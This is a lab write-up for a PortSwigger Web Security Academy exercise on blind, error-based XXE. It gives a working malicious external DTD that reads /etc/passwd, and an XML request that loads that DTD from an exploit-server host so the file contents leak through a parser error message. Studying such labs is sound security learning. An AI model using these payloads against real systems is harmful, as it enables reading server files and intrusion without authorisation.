# XXE Lab 8 — Exploiting blind XXE to retrieve data via error messages — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** XXE (Blind, error-based)
**Lab:** Exploiting blind XXE to retrieve data via error messages
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~03:15 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Blind XXE with error-based exfiltration — a malicious external DTD makes the parser try to load a nonexistent file whose path contains `/etc/passwd`, and the parser's error message leaks the file contents.

## Solution

1. Hosted this DTD on the lab's exploit server at `https://exploit-0a2500b70351393181ed7eb401cb0034.exploit-server.net/dtd` (stored via the exploit server's Store form, `formAction=STORE`, `Content-Type: text/xml`):
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
2. Sent the stock-check XML referencing it:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a2500b70351393181ed7eb401cb0034.exploit-server.net/dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
3. The parser loaded the DTD, read `/etc/passwd` into `%file;`, then tried to load `file:///invalid/<passwd-contents>` — and the error message contained the whole file: `XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...`
4. Home page then showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** the attack never shows the file directly — instead it smuggles the file contents into a *filename* the parser tries to open. The parser's error message helpfully prints that filename, and the file contents ride along inside it.
- **The parameter-entity chain is the trick:** `%eval;` defines a new entity `%exfil;` whose system identifier contains `%file;` — the parser expands it only when the entity is *used*, which is why the file contents end up in the error path.
- **Exploit-server note:** the store form needs the `formAction=STORE` submit value or it returns 400; the DTD must be stored with a `text/xml` content type.

## Lessons Learned

- Blind does not mean blind: error messages are an exfiltration channel — a parser that prints filenames in errors leaks whatever you can put into a filename.
- Parameter entities (`%name;`) expand inside the DTD itself, which is how the file contents get injected into the error path.

## Next Steps

- Lab 7 (malicious external DTD, OOB exfil) — same DTD-hosting technique; the hostname was recovered from the exploit server's access log instead of Burp Collaborator.
- Labs 3 and 4 (blind OOB) need Burp Collaborator on his own computer.
